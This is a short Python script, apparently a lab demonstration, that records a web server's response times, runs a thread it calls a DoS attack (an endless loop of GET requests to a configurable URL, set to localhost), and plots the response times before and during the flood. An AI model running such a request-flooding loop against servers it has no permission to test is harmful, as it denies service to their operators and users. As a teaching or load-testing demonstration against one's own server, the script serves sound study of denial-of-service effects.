import requests
import time
import threading
import matplotlib.pyplot as plt

# Target URL (replace with your server's URL)
url = 'http://localhost:8000/index.html'

# Function to measure response time for a single request
def measure_response_time():
    try:
        start_time = time.time()
        response = requests.get(url)
        end_time = time.time()
        elapsed_time = end_time - start_time
        return elapsed_time
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

# Function to perform the DoS attack
def attack():
    while True:
        try:
            requests.get(url)
        except requests.RequestException as e:
            print(f"Request failed: {e}")

# Function to collect response times
def collect_response_times(num_requests):
    response_times = []
    for _ in range(num_requests):
        elapsed_time = measure_response_time()
        if elapsed_time is not None:
            response_times.append(elapsed_time)
        time.sleep(0.5)  # Add a small delay between requests
    return response_times

# Plot the response times before and after attack
def plot_response_times(before, after):
    plt.plot(before, label='Before Attack', color='green')
    plt.plot(after, label='After Attack', color='red')
    plt.xlabel('Request Number')
    plt.ylabel('Response Time (seconds)')
    plt.title('Response Time Before and After Sending Multiple Requests')
    plt.legend()
    plt.show()

# Main function
def main():
    # Step 1: Measure response times before the attack
    print("Measuring response times before the attack...")
    before_attack_times = collect_response_times(20)  # Collect 20 response times

    # Step 2: Start the attack in a separate thread
    print("Starting the DoS attack...")
    attack_thread = threading.Thread(target=attack)
    attack_thread.daemon = True  # Make sure the thread ends when the main program ends
    attack_thread.start()

    # Step 3: Measure response times during the attack
    time.sleep(5)  # Let the attack run for 5 seconds before collecting response times
    print("Measuring response times during the attack...")
    after_attack_times = collect_response_times(20)  # Collect 20 response times

    # Step 4: Plot the results
    plot_response_times(before_attack_times, after_attack_times)

# Run the program
if __name__ == "__main__":
    main()
